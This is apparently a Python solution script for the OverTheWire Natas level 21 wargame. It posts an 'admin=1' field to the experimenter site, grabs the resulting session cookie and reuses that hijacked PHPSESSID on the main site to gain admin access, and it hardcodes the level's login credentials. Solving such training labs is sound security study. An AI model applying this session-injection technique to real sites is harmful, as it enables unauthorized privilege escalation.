import requests as req

username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
url1 = "http://natas21.natas.labs.overthewire.org/"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=True" 

session = req.Session()

# actually just need submit: Update and admin: 1
response = session.post(url2, data={"align": 'left', "admin": '1', "submit":'Update'}, auth=(username, password))
print(response.text)
sid=session.cookies['PHPSESSID'] # we should now have the sessionid

# use the hijacked sessionid here, submit a get req on the original site
response = session.get(url1, cookies={'PHPSESSID': sid}, auth=(username, password))
print(response.text)